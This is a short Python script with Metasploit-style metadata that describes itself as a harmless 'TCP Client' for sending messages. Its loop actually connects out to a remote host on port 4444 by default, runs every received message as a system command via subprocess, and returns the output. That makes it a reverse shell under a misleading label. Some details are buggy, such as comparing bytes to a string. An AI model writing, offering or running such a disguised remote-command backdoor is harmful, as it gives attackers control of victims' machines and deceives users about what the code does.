#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
from rich.console import Console
import subprocess
console = Console()

# Metadata الخاصة بأداة العميل TCP
metadata = {
    'name': 'TCP Client',
    'description': 'Tool to connect and send messages to a TCP server.',
    'authors': ['Your Name'],
    'date': '2023-04-01',
    'license': 'YOUR_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://www.example.com/tcp-client-info'},
    ],
    'options': {
        'RHOST': {'type': 'address', 'description': 'The server address', 'required': True, 'default': '127.0.0.1'},
        'RPORT': {'type': 'int', 'description': 'The server port', 'required': True, 'default': 4444}
    }
}

class TCPClient:
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port

    def start(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            try:
                client_socket.connect((self.server_host, self.server_port))
                console.print(f"Connected to {self.server_host}:{self.server_port}")

                while True:
                    message =  client_socket.recv(1024)
                    if message.lower() == 'exit':
                        break
                    print(message)
                    command = subprocess.check_output(message)
                    print(command)
                    client_socket.send(command)
                    # response = client_socket.recv(1024)
                    # console.print(f"[bold cyan]Received:[/bold cyan] {response.decode()}")
            except Exception as e:
                console.print(f"[bold red]Error:[/bold red] {e}")

def run(args):
    rhost = args.get('RHOST', '127.0.0.1')
    rport = args.get('RPORT', 4444)
    client = TCPClient(rhost, rport)
    client.start()

if __name__ == '__main__':
    args = {
        'RHOST': '127.0.0.1',
        'RPORT': 4446
    }
    run(args)
